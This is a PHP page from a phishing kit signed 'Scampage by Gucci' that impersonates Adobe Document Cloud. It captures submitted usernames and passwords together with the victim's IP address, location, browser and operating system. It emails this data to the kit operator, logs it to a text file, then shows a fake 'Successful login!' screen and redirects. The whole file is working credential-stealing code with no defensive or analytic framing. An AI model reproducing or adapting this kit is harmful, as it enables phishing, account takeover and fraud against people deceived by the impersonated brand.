
<?php
/*
 * Scampage by Gucci
 * ICQ: 713566330
 */
require "CONTROLS.php";
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";

error_reporting(0);
ini_set('display_errors', 0);
date_default_timezone_set('Europe/London');




$date = date('l d F Y');
$time = date('H:i');
$user = $_SESSION['username'];
$user2 = $_POST['username'];
$pass = $_SESSION['password'];
$pass2 = $_POST['password'];

$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$VictimInfo1 = "Submitted by : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")";
$VictimInfo2 = "Location : " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "";
$VictimInfo3 = "UserAgent : " . $systemInfo['useragent'] . "";
$VictimInfo4 = "Browser : " . $systemInfo['browser'] . "";
$VictimInfo5 = "Os : " . $systemInfo['os'] . "";
$data = "
<^>-----------------------Gucci-----------------------<^>

<^>Login<^>
Username : $user
Password : $pass

Username2 : $user2
Password2 : $pass2

<^>Victim PC details<^>
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5

Received : $date @ $time
<^>-----------------------Gucci-----------------------<^>
";



if ($sendEmail === 1) {

    mail($to,  "Adobe from " . $_SERVER['REMOTE_ADDR'], $data);
}

if ($saveFile === 1) {
    $file = fopen('assets/logs/accounts.txt', 'a');
    fwrite($file, $data . "\n");
    fclose($file);
}


?>


<html>

<head>
    <title>Adobe Document Cloud</title>
    <link rel="shortcut icon" href="assets/files/favicon.png" type="image/x-icon">
    <meta http-equiv="refresh" content="5;url=<?php echo $ExitLink; ?>" />
</head>

<body marginheight="0" marginwidth="0" topmargin="0" bottommargin="0" leftmargin="0" rightmargin="0">

<table width="100%" height="100%" cellspacing="0">

    <tr><td height="20%" bgcolor="#000000">

            <table align="center"><tr>

                    <td>

                        <img src="assets/files/logo.jpg" width="330" height="70">

                    </td>






                    <td width="750">

                        <table width="" align="right">

                            <tr><td>

                                    <font face="verdana" size="+2" color="#FFFFFF">
                                        Adobe Document Cloud
                                    </font>

                                </td></tr>





                        </table>

                    </td>

                </tr></table>

        </td></tr>









    <tr><td height="70%" background="assets/files/background.jpg">

            <table><tr>

                    <td width="200"></td>





                    <td>

                        <table>

                            <tr><td height="10"><td></tr>




                            <tr><td>

                                    <font face="verdana" size="2" color="#FFFFFF">

                                        <font size="+2">Successful login!</font>
                                        <br />

                                        <br>
                                        <img src="assets/spin.gif" style="width: 15px;" alt=""> You will be redirected shortly to your adobe document.

                                    </font>

                                </td></tr>




                            <tr><td height="35"><td></tr>







                        </table>

                    </td>

                </tr></table>

        </td></tr>









    <tr><td height="10%" bgcolor="#000000">

            <div align="center">
                <img src="assets/files/footer.png" width="550" height="38">
            </div>

        </td></tr>

</table>

</body>

</html>